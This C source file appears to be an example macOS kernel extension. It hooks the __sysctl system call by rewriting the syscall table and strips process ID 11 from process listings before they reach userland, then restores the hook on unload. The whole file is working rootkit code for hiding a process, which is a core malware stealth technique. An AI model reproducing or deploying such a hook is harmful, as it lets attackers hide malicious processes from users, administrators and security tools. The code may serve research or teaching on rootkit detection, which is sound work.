/* This examplecode hides process 11 */

#define PROC_DEF_ENABLED
#define SYSCTL_DEF_ENABLED

#include <sys/proc.h>
#include <sys/sysctl.h>
#include <sys/systm.h>
#include <sys/attr.h>
#include <sys/dirent.h>

#include <mach/mach_types.h>
#include <libkern/libkern.h>

/* Arguments struct pulled from kernel source */ 
struct __sysctl_args {
  char name_l_[PADL_(user_addr_t)]; user_addr_t name; char name_r_[PADR_(user_addr_t)];
  char namelen_l_[PADL_(u_int)]; u_int namelen; char namelen_r_[PADR_(u_int)];
  char old_l_[PADL_(user_addr_t)]; user_addr_t old; char old_r_[PADR_(user_addr_t)];
  char oldlenp_l_[PADL_(user_addr_t)]; user_addr_t oldlenp; char oldlenp_r_[PADR_(user_addr_t)];
  char new_l_[PADL_(user_addr_t)]; user_addr_t new; char new_r_[PADR_(user_addr_t)];
  char newlen_l_[PADL_(user_size_t)]; user_size_t newlen; char newlen_r_[PADR_(user_size_t)];
};

/* Commands of interrest */ 
#define    CTL_KERN     1
#define    KERN_PROC   14

/* Pointer to original syscall */
int (*org__sysctl)(void *p, struct __sysctl_args *uap, register_t *retval);

int new__sysctl(void *p, struct __sysctl_args *uap, register_t *retval)
{
  int name[CTL_MAXNAME];
  int error;
  int ret;
  struct kinfo_proc *plist;
  size_t oldlen = 0;
  int i = 0, nprocs = 0;
  void *mem = NULL;
  
  /* Call the original sysctl-function */
  ret = org__sysctl(p,uap,retval); 
  
  /* Check if the call was successfull */
  if (ret)
    return (ret);
  
  /* Grab a copy of the arguments from userland and place it on the stack */
  error = copyin(uap->name, &name[0], uap->namelen * sizeof(int));
  
  /* If something went wrong with our copy we return here */
  if(error) 
    return(ret);
  
  /* Check if this is a call we want to manipulate */
  if(uap->namelen >= 3 &&
     name[0] == CTL_KERN &&
     name[1] == KERN_PROC)
    {

      /* Some error checking */
      if(uap->oldlenp == USER_ADDR_NULL ||
	 uap->old == USER_ADDR_NULL ||
	 uap->oldlenp == 0)
	return(ret); /* eeek ... */
            
      /* Get size of data returned from sysctl-call */
      { /* Borrowed from the kernel source */ 
	uint64_t  oldlen64  = fuulong(uap->oldlenp);
	oldlen = CAST_DOWN(size_t, oldlen64);
      }
      
      /* Allocate some memory */
      MALLOC(mem,void *,oldlen,M_TEMP,M_WAITOK);
      
      if(mem == NULL)
	return(ret); /* epic failure */
      
      /* Copy in the data */
      error = copyin(uap->old, mem, oldlen); 
      if (error)
	{
	  FREE(mem,M_TEMP);
	  return(ret);
	}
      
      /* Point to the first struct */
      plist = mem;
      
      /* Calculate number of entries to process */
      nprocs = oldlen / sizeof(struct kinfo_proc);
      
      /* Search for process to remove */
      for (i = 0; i < nprocs; i++) 
	if(plist[i].kp_proc.p_pid == 11) /* hide pid 11 */
	  { 
	    /* If there is more then one entry in the list we overwrite it */
	    if((i+1) < nprocs)
	      bcopy(&plist[i+1],&plist[i],(nprocs - (i + 1)) * sizeof(struct kinfo_proc));
	    
	    /* Decrease size */
	    oldlen -= sizeof(struct kinfo_proc);
	    nprocs--;
	  }

      /* Copy back the lenght to userspace */
      suulong(uap->oldlenp,oldlen);
      
      /* Copy the data back to userspace */
      error = copyout(mem,uap->old, oldlen); 
      
      FREE(mem,M_TEMP);
    }
  
  /* Done */
  return(ret);
}


kern_return_t hideproc_start (kmod_info_t * ki, void * d) {

  sysent = locate_sysent();
  if (sysent == NULL) {
    return KERN_FAILURE;
  }
   
  /* Store original address of syscall */ 
  org__sysctl = (void *) sysent[SYS___sysctl].sy_call; 
  
  /* Replace syscall in syscall table */
  sysent[SYS___sysctl].sy_call = (void *)new__sysctl;
  return KERN_SUCCESS;
}

kern_return_t hideproc_stop (kmod_info_t * ki, void * d) {

  /* Restore syscall */
  sysent[SYS___sysctl].sy_call = (void *)org__sysctl;

  return KERN_SUCCESS;
}
